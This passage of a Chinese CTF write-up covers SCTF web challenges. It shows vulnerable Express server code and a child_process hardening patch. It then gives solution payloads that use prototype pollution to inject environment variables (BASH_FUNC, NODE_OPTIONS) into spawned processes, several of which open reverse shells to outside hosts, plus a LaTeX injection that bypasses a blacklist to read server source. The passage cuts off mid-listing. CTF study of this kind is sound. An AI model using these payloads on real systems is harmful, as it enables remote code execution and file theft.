class="hljs-subst">$&#123;passwd&#125;</span>&#x27;;`</span><br>      con.<span class="hljs-title function_">query</span>(sql, <span class="hljs-function">(<span class="hljs-params">err, rows</span>) =&gt;</span> &#123;<br>        <span class="hljs-keyword">if</span> (err) <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Error</span>(err.<span class="hljs-property">message</span>);<br>        <span class="hljs-keyword">if</span> (rows[<span class="hljs-number">0</span>][<span class="hljs-title class_">Object</span>.<span class="hljs-title function_">keys</span>(rows[<span class="hljs-number">0</span>])]) &#123;<br>          <span class="hljs-keyword">const</span> token = jwt.<span class="hljs-title function_">sign</span>(&#123;username, <span class="hljs-attr">role</span>: username&#125;, <span class="hljs-variable constant_">SECRET_KEY</span>, &#123;<span class="hljs-attr">expiresIn</span>: <span class="hljs-string">&#x27;1h&#x27;</span>&#125;);<br>          res.<span class="hljs-title function_">cookie</span>(<span class="hljs-string">&#x27;auth_token&#x27;</span>, token, &#123;<span class="hljs-attr">secure</span>: <span class="hljs-literal">false</span>&#125;);<br>          res.<span class="hljs-title function_">status</span>(<span class="hljs-number">200</span>).<span class="hljs-title function_">json</span>(&#123;<span class="hljs-attr">success</span>: <span class="hljs-literal">true</span>, <span class="hljs-attr">message</span>: <span class="hljs-string">&#x27;Login Successfully&#x27;</span>&#125;);<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>          res.<span class="hljs-title function_">status</span>(<span class="hljs-number">200</span>).<span class="hljs-title function_">json</span>(&#123;<span class="hljs-attr">success</span>: <span class="hljs-literal">false</span>, <span class="hljs-attr">message</span>: <span class="hljs-string">&#x27;Errow Password!&#x27;</span>&#125;);<br>        &#125;<br>      &#125;);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>      res.<span class="hljs-title function_">status</span>(<span class="hljs-number">403</span>).<span class="hljs-title function_">json</span>(&#123;<span class="hljs-attr">success</span>: <span class="hljs-literal">false</span>, <span class="hljs-attr">message</span>: <span class="hljs-string">&#x27;This Website Only Open for admin&#x27;</span>&#125;);<br>    &#125;<br>  &#125; <span class="hljs-keyword">catch</span> (error) &#123;<br>    res.<span class="hljs-title function_">status</span>(<span class="hljs-number">500</span>).<span class="hljs-title function_">json</span>(&#123; <span class="hljs-attr">success</span>: <span class="hljs-literal">false</span>, <span class="hljs-attr">message</span>: <span class="hljs-string">&#x27;Error decrypting password!&#x27;</span> &#125;);<br>  &#125;<br>&#125;);<br><br>app.<span class="hljs-title function_">get</span>(<span class="hljs-string">&#x27;/ExP0rtApi&#x27;</span>, verifyAdmin, <span class="hljs-function">(<span class="hljs-params">req, res</span>) =&gt;</span> &#123;<br>  <span class="hljs-keyword">var</span> rootpath = req.<span class="hljs-property">query</span>.<span class="hljs-property">v</span>;<br>  <span class="hljs-keyword">var</span> file = req.<span class="hljs-property">query</span>.<span class="hljs-property">f</span>;<br><br>  file = file.<span class="hljs-title function_">replace</span>(<span class="hljs-regexp">/\.\.\//g</span>, <span class="hljs-string">&#x27;&#x27;</span>);<br>  rootpath = rootpath.<span class="hljs-title function_">replace</span>(<span class="hljs-regexp">/\.\.\//g</span>, <span class="hljs-string">&#x27;&#x27;</span>);<br><br>  <span class="hljs-keyword">if</span>(rootpath === <span class="hljs-string">&#x27;&#x27;</span>)&#123;<br>    <span class="hljs-keyword">if</span>(file === <span class="hljs-string">&#x27;&#x27;</span>)&#123;<br>      <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">status</span>(<span class="hljs-number">500</span>).<span class="hljs-title function_">send</span>(<span class="hljs-string">&#x27;try to find parameters HaHa&#x27;</span>);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>      rootpath = <span class="hljs-string">&quot;static&quot;</span><br>    &#125;<br>  &#125;<br><br>  <span class="hljs-keyword">const</span> filePath = path.<span class="hljs-title function_">join</span>(__dirname, rootpath + <span class="hljs-string">&quot;/&quot;</span> + file);<br><br>  <span class="hljs-keyword">if</span> (!fs.<span class="hljs-title function_">existsSync</span>(filePath)) &#123;<br>    <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">status</span>(<span class="hljs-number">404</span>).<span class="hljs-title function_">send</span>(<span class="hljs-string">&#x27;File not found&#x27;</span>);<br>  &#125;<br>  fs.<span class="hljs-title function_">readFile</span>(filePath, <span class="hljs-function">(<span class="hljs-params">err, fileData</span>) =&gt;</span> &#123;<br>    <span class="hljs-keyword">if</span> (err) &#123;<br>      <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(<span class="hljs-string">&#x27;Error reading file:&#x27;</span>, err);<br>      <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">status</span>(<span class="hljs-number">500</span>).<span class="hljs-title function_">send</span>(<span class="hljs-string">&#x27;Error reading file&#x27;</span>);<br>    &#125;<br><br>    zlib.<span class="hljs-title function_">gzip</span>(fileData, <span class="hljs-function">(<span class="hljs-params">err, compressedData</span>) =&gt;</span> &#123;<br>      <span class="hljs-keyword">if</span> (err) &#123;<br>        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(<span class="hljs-string">&#x27;Error compressing file:&#x27;</span>, err);<br>        <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">status</span>(<span class="hljs-number">500</span>).<span class="hljs-title function_">send</span>(<span class="hljs-string">&#x27;Error compressing file&#x27;</span>);<br>      &#125;<br>      <span class="hljs-keyword">const</span> base64Data = compressedData.<span class="hljs-title function_">toString</span>(<span class="hljs-string">&#x27;base64&#x27;</span>);<br>      res.<span class="hljs-title function_">send</span>(base64Data);<br>    &#125;);<br>  &#125;);<br>&#125;);<br><br>app.<span class="hljs-title function_">get</span>(<span class="hljs-string">&quot;/report&quot;</span>, verifyAdmin ,<span class="hljs-function">(<span class="hljs-params">req, res</span>) =&gt;</span> &#123;<br>  res.<span class="hljs-title function_">sendFile</span>(__dirname + <span class="hljs-string">&quot;/static/report_noway_dirsearch.html&quot;</span>);<br>&#125;);<br><br>app.<span class="hljs-title function_">post</span>(<span class="hljs-string">&quot;/report&quot;</span>, verifyAdmin ,<span class="hljs-function">(<span class="hljs-params">req, res</span>) =&gt;</span> &#123;<br>  <span class="hljs-keyword">const</span> &#123;user, date, reportmessage&#125; = req.<span class="hljs-property">body</span>;<br>  <span class="hljs-keyword">if</span>(<span class="hljs-title class_">Reportcache</span>[user] === <span class="hljs-literal">undefined</span>) &#123;<br>    <span class="hljs-title class_">Reportcache</span>[user] = &#123;&#125;;<br>  &#125;<br>  <span class="hljs-title class_">Reportcache</span>[user][date] = reportmessage<br>  res.<span class="hljs-title function_">status</span>(<span class="hljs-number">200</span>).<span class="hljs-title function_">send</span>(<span class="hljs-string">&quot;&lt;script&gt;alert(&#x27;Report Success&#x27;);window.location.href=&#x27;/report&#x27;&lt;/script&gt;&quot;</span>);<br>&#125;);<br><br>app.<span class="hljs-title function_">get</span>(<span class="hljs-string">&#x27;/countreport&#x27;</span>, <span class="hljs-function">(<span class="hljs-params">req, res</span>) =&gt;</span> &#123;<br>  <span class="hljs-keyword">let</span> count = <span class="hljs-number">0</span>;<br>  <span class="hljs-keyword">for</span> (<span class="hljs-keyword">const</span> user <span class="hljs-keyword">in</span> <span class="hljs-title class_">Reportcache</span>) &#123;<br>    count += <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">keys</span>(<span class="hljs-title class_">Reportcache</span>[user]).<span class="hljs-property">length</span>;<br>  &#125;<br>  res.<span class="hljs-title function_">json</span>(&#123; count &#125;);<br>&#125;);<br><br><span class="hljs-comment">//查看当前运行用户</span><br>app.<span class="hljs-title function_">get</span>(<span class="hljs-string">&quot;/VanZY_s_T3st&quot;</span>, <span class="hljs-function">(<span class="hljs-params">req, res</span>) =&gt;</span> &#123;<br>  <span class="hljs-keyword">var</span> command = <span class="hljs-string">&#x27;whoami&#x27;</span>;<br>  <span class="hljs-keyword">const</span> cmd = cp.<span class="hljs-title function_">spawn</span>(command ,[]);<br>  cmd.<span class="hljs-property">stdout</span>.<span class="hljs-title function_">on</span>(<span class="hljs-string">&#x27;data&#x27;</span>, <span class="hljs-function">(<span class="hljs-params">data</span>) =&gt;</span> &#123;<br>    res.<span class="hljs-title function_">status</span>(<span class="hljs-number">200</span>).<span class="hljs-title function_">end</span>(data.<span class="hljs-title function_">toString</span>());<br>  &#125;);<br>&#125;)<br><br>app.<span class="hljs-title function_">listen</span>(<span class="hljs-number">3000</span>, <span class="hljs-function">() =&gt;</span> &#123;<br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;Server running on http://localhost:3000&#x27;</span>);<br>&#125;);<br></code></pre></td></tr></table></figure><p>刚开始猜测是打原型链污染child_progress，但是读到这个Node最新版本算是，没辙。</p><p>本地起一个这个玩意还报错了handle找不到，猜测他还有handle里的东西，结果真有：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-comment">// /app/handle/index.js</span><br><br><span class="hljs-keyword">var</span> ritm = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;require-in-the-middle&#x27;</span>);<br><span class="hljs-keyword">var</span> patchChildProcess = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;./child_process&#x27;</span>);<br><br><span class="hljs-keyword">new</span> ritm.<span class="hljs-title class_">Hook</span>(<br>    [<span class="hljs-string">&#x27;child_process&#x27;</span>],<br>    <span class="hljs-keyword">function</span> (<span class="hljs-params"><span class="hljs-variable language_">module</span>, name</span>) &#123;<br>        <span class="hljs-keyword">switch</span> (name) &#123;<br>            <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;child_process&#x27;</span>: &#123;<br>                <span class="hljs-keyword">return</span> <span class="hljs-title function_">patchChildProcess</span>(<span class="hljs-variable language_">module</span>);<br>            &#125;<br>        &#125;<br>    &#125;<br>);<br></code></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-comment">// /app/handle/child_process.js</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">patchChildProcess</span>(<span class="hljs-params">cp</span>) &#123;<br><br>    cp.<span class="hljs-property">execFile</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Proxy</span>(cp.<span class="hljs-property">execFile</span>, &#123; <span class="hljs-attr">apply</span>: <span class="hljs-title function_">patchOptions</span>(<span class="hljs-literal">true</span>) &#125;);<br>    cp.<span class="hljs-property">fork</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Proxy</span>(cp.<span class="hljs-property">fork</span>, &#123; <span class="hljs-attr">apply</span>: <span class="hljs-title function_">patchOptions</span>(<span class="hljs-literal">true</span>) &#125;);<br>    cp.<span class="hljs-property">spawn</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Proxy</span>(cp.<span class="hljs-property">spawn</span>, &#123; <span class="hljs-attr">apply</span>: <span class="hljs-title function_">patchOptions</span>(<span class="hljs-literal">true</span>) &#125;);<br>    cp.<span class="hljs-property">execFileSync</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Proxy</span>(cp.<span class="hljs-property">execFileSync</span>, &#123; <span class="hljs-attr">apply</span>: <span class="hljs-title function_">patchOptions</span>(<span class="hljs-literal">true</span>) &#125;);<br>    cp.<span class="hljs-property">execSync</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Proxy</span>(cp.<span class="hljs-property">execSync</span>, &#123; <span class="hljs-attr">apply</span>: <span class="hljs-title function_">patchOptions</span>() &#125;);<br>    cp.<span class="hljs-property">spawnSync</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Proxy</span>(cp.<span class="hljs-property">spawnSync</span>, &#123; <span class="hljs-attr">apply</span>: <span class="hljs-title function_">patchOptions</span>(<span class="hljs-literal">true</span>) &#125;);<br><br>    <span class="hljs-keyword">return</span> cp;<br>&#125;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">patchOptions</span>(<span class="hljs-params">hasArgs</span>) &#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">apply</span>(<span class="hljs-params">target, thisArg, args</span>) &#123;<br>        <span class="hljs-keyword">var</span> pos = <span class="hljs-number">1</span>;<br>        <span class="hljs-keyword">if</span> (pos === args.<span class="hljs-property">length</span>) &#123;<br>            args[pos] = <span class="hljs-title function_">prototypelessSpawnOpts</span>();<br>        &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (pos &lt; args.<span class="hljs-property">length</span>) &#123;<br>            <span class="hljs-keyword">if</span> (hasArgs &amp;&amp; (<span class="hljs-title class_">Array</span>.<span class="hljs-title function_">isArray</span>(args[pos]) || args[pos] == <span class="hljs-literal">null</span>)) &#123;<br>                pos++;<br>            &#125;<br>            <span class="hljs-keyword">if</span> (<span class="hljs-keyword">typeof</span> args[pos] === <span class="hljs-string">&#x27;object&#x27;</span> &amp;&amp; args[pos] !== <span class="hljs-literal">null</span>) &#123;<br>                args[pos] = <span class="hljs-title function_">prototypelessSpawnOpts</span>(args[pos]);<br>            &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (args[pos] == <span class="hljs-literal">null</span>) &#123;<br>                args[pos] = <span class="hljs-title function_">prototypelessSpawnOpts</span>();<br>            &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (<span class="hljs-keyword">typeof</span> args[pos] === <span class="hljs-string">&#x27;function&#x27;</span>) &#123;<br>                args.<span class="hljs-title function_">splice</span>(pos, <span class="hljs-number">0</span>, <span class="hljs-title function_">prototypelessSpawnOpts</span>());<br>            &#125;<br>        &#125;<br><br>        <span class="hljs-keyword">return</span> target.<span class="hljs-title function_">apply</span>(thisArg, args);<br>    &#125;;<br>&#125;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">prototypelessSpawnOpts</span>(<span class="hljs-params">obj</span>) &#123;<br>    <span class="hljs-keyword">var</span> prototypelessObj = <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">assign</span>(<span class="hljs-title class_">Object</span>.<span class="hljs-title function_">create</span>(<span class="hljs-literal">null</span>), obj);<br>    prototypelessObj.<span class="hljs-property">env</span> = <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">assign</span>(<span class="hljs-title class_">Object</span>.<span class="hljs-title function_">create</span>(<span class="hljs-literal">null</span>), prototypelessObj.<span class="hljs-property">env</span> || process.<span class="hljs-property">env</span>);<br>    <span class="hljs-keyword">return</span> prototypelessObj;<br>&#125;<br><br><span class="hljs-variable language_">module</span>.<span class="hljs-property">exports</span> = patchChildProcess;<br></code></pre></td></tr></table></figure><p>用的环境变量劫持，pp2rce，直接修改shell变量，由于它本地有个&#x2F;readflag所以能直接读了。又学到了啊：</p><p><a href="https://www.leavesongs.com/PENETRATION/how-I-hack-bash-through-environment-injection.html">https://www.leavesongs.com/PENETRATION/how-I-hack-bash-through-environment-injection.html</a></p><p>学长这么打的：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br>    <span class="hljs-attr">&quot;user&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;__proto__&quot;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;date&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;2&quot;</span><span class="hljs-punctuation">,</span> <br>    <span class="hljs-attr">&quot;reportmessage&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;shell&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;/bin/bash&quot;</span><span class="hljs-punctuation">,</span><br><span class="hljs-attr">&quot;argv0&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;/bin/bash&quot;</span><span class="hljs-punctuation">,</span><br><span class="hljs-attr">&quot;env&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span><br><span class="hljs-attr">&quot;BASH_FUNC_whoami%%&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;() &#123; /readflag &gt; /tmp/123; &#125;&quot;</span><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">&#125;</span><br>    <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span>cookies=<span class="hljs-punctuation">&#123;</span><br>        <span class="hljs-attr">&quot;auth_token&quot;</span><span class="hljs-punctuation">:</span>admin_cookie<br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p>星盟：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br><span class="hljs-attr">&quot;user&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;__proto__&quot;</span><span class="hljs-punctuation">,</span><br><span class="hljs-attr">&quot;date&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-number">2</span><span class="hljs-punctuation">,</span><br><span class="hljs-attr">&quot;reportmessage&quot;</span><span class="hljs-punctuation">:</span> <br>    <span class="hljs-punctuation">&#123;</span><br>    <span class="hljs-attr">&quot;shell&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;/readflag&quot;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;env&quot;</span><span class="hljs-punctuation">:</span> <br>        <span class="hljs-punctuation">&#123;</span><br>            <span class="hljs-attr">&quot;NODE_DEBUG&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;require(\&quot;child_process\&quot;).exec(\&quot;bash -c &#x27;bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1&#x27;\&quot;);process.exit()//&quot;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-attr">&quot;NODE_OPTIONS&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;--require /proc/self/environ&quot;</span><br><br>        <span class="hljs-punctuation">&#125;</span><br>    <span class="hljs-punctuation">&#125;</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p>W&amp;M:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">add_report</span>(<span class="hljs-params">username,date,report</span>):<br>    resp = rs.post(remote_addr+<span class="hljs-string">&quot;/report&quot;</span>,json=&#123;<span class="hljs-string">&quot;user&quot;</span>:username,<span class="hljs-string">&quot;date&quot;</span>:date,<span class="hljs-string">&quot;reportmessage&quot;</span>:report&#125;)<br>    <span class="hljs-keyword">assert</span> <span class="hljs-string">&#x27;Report Success&#x27;</span> <span class="hljs-keyword">in</span> resp.text<br><br>add_report(<span class="hljs-string">&quot;__proto__&quot;</span>,<span class="hljs-number">2</span>,&#123;<span class="hljs-string">&quot;shell&quot;</span>:<span class="hljs-string">&quot;/proc/self/exe&quot;</span>,<span class="hljs-string">&quot;argv0&quot;</span>:<span class="hljs-string">&quot;console.log(require(&#x27;child_process&#x27;).execSync(&#x27;bash -c \&quot;/bin/sh -i &gt;&amp; /dev/tcp/123.45.6.7/9999 0&gt;&amp;1\&quot;&#x27;).toString())//&quot;</span>,<span class="hljs-string">&quot;env&quot;</span>:&#123;<span class="hljs-string">&quot;NODE_OPTIONS&quot;</span>:<span class="hljs-string">&quot;--require /proc/self/cmdline&quot;</span>&#125;&#125;)<br></code></pre></td></tr></table></figure><h2 id="ez-tex"><a href="#ez-tex" class="headerlink" title="ez_tex"></a>ez_tex</h2><p>没打出来，有点遗憾。W&amp;M还是太猛了。</p><p>LaTex Injection绕所有黑名单：</p><p>[PayloadsAllTheThings&#x2F;LaTeX Injection&#x2F;README.md at master · swisskyrepo&#x2F;PayloadsAllTheThings (github.com)](<a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/LaTeX">https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/LaTeX</a> Injection&#x2F;README.md)</p><p><img src="/2024/10/05/sctf-web-learning/image-20241006000009619.png" alt="image-20241006000009619"></p><p>提示&#x2F;log，有个app.log不知道咋用。想想怎么带出数据。</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs tex"><span class="hljs-keyword">\documentclass</span>[]&#123;article&#125;<br><span class="hljs-keyword">\begin</span>&#123;document&#125;<br><br><span class="hljs-keyword">\newread</span><span class="hljs-keyword">\infile</span><br><span class="hljs-keyword">\openin</span><span class="hljs-keyword">\infile</span>=main.py<br><span class="hljs-keyword">\imm</span>^^65diate<span class="hljs-keyword">\newwrite</span><span class="hljs-keyword">\outfile</span><br><span class="hljs-keyword">\imm</span>^^65diate<span class="hljs-keyword">\openout</span><span class="hljs-keyword">\outfile</span>=a^^70p.l^^6fg<br><span class="hljs-keyword">\loop</span><span class="hljs-keyword">\unless</span><span class="hljs-keyword">\ifeof</span><span class="hljs-keyword">\infile</span><br>    <span class="hljs-keyword">\imm</span>^^65diate<span class="hljs-keyword">\read</span><span class="hljs-keyword">\infile</span> to<span class="hljs-keyword">\line</span><br>    <span class="hljs-keyword">\imm</span>^^65diate<span class="hljs-keyword">\write</span><span class="hljs-keyword">\outfile</span>&#123;<span class="hljs-keyword">\line</span>&#125;<br><span class="hljs-keyword">\repeat</span><br><span class="hljs-keyword">\closeout</span><span class="hljs-keyword">\outfile</span><br><span class="hljs-keyword">\closein</span><span class="hljs-keyword">\infile</span><br><span class="hljs-keyword">\newpage</span><br>foo<br><span class="hljs-keyword">\end</span>&#123;document&#125;<br></code></pre></td></tr></table></figure><p>读到main.py：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> os <br><span class="hljs-keyword">import</span> logging <br><span class="hljs-keyword">import</span> subprocess <br><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask, request, render_template, redirect <br><span class="hljs-keyword">from</span> werkzeug.utils <span class="hljs-keyword">import</span> secure_filename <br><br>app = Flask(__name__) <br><br><span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> app.debug: <br>        handler = logging.FileHandler(<span class="hljs-string">&#x27;app.log&#x27;</span>) <br>        handler.setLevel(logging.INFO) <br>        app.logger.addHandler(handler) <br><br>UPLOAD_FOLDER = <span class="hljs-string">&#x27;uploads&#x27;</span> <br>app.config[<span class="hljs-string">&#x27;UPLOAD_FOLDER&#x27;</span>] = UPLOAD_FOLDER <br><br>os.makedirs(UPLOAD_FOLDER, exist_ok=<span class="hljs-literal">True</span>) <br><br>ALLOWED_EXTENSIONS = &#123;<span class="hljs-string">&#x27;txt&#x27;</span>, <span class="hljs-string">&#x27;png&#x27;</span>, <span class="hljs-string">&#x27;jpg&#x27;</span>, <span class="hljs-string">&#x27;gif&#x27;</span>, <span class="hljs-string">&#x27;log&#x27;</span>, <span class="hljs-string">&#x27;tex&#x27;</span>&#125; <br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">allowed_file</span>(<span class="hljs-params">filename</span>): <br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;.&#x27;</span> <span class="hljs-keyword">in</span> filename <span class="hljs-keyword">and</span> \ <br>        filename.rsplit(<span class="hljs-string">&#x27;.&#x27;</span>, <span class="hljs-number">1</span>)[<span class="hljs-number">1</span>].lower() <span class="hljs-keyword">in</span> ALLOWED_EXTENSIONS <br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">compile_tex</span>(<span class="hljs-params">file_path</span>): <br>        output_filename = file_path.rsplit(<span class="hljs-string">&#x27;.&#x27;</span>, <span class="hljs-number">1</span>)[<span class="hljs-number">0</span>] + <span class="hljs-string">&#x27;.pdf&#x27;</span> <br>        <span class="hljs-keyword">try</span>: <br>                subprocess.check_call([<span class="hljs-string">&#x27;pdflatex&#x27;</span>, file_path]) <br>                <span class="hljs-keyword">return</span> output_filename <br>        <span class="hljs-keyword">except</span> subprocess.CalledProcessError <span class="hljs-keyword">as</span> e: <br>                <span class="hljs-keyword">return</span> <span class="hljs-built_in">str</span>(e) <br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/&#x27;</span></span>) </span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">index</span>(): <br>        <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;index.html&#x27;</span>) <br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/upload&#x27;</span>, methods=[<span class="hljs-string">&#x27;POST&#x27;</span>]</span>) </span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">upload_file</span>(): <br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;file&#x27;</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> request.files: <br>                <span class="hljs-keyword">return</span> redirect(request.url) <br>        file = request.files[<span class="hljs-string">&#x27;file&#x27;</span>] <br>        <span class="hljs-keyword">if</span> file.filename == <span class="hljs-string">&#x27;&#x27;</span>: <br>                <span class="hljs-keyword">return</span> redirect(request.url) <br><br>        <span class="hljs-keyword">if</span> file <span class="hljs-keyword">and</span> allowed_file(file.filename): <br>                content = file.read() <br>                <span class="hljs-keyword">try</span>: <br>                        content_str = content.decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>) <br>                <span class="hljs-keyword">except</span> 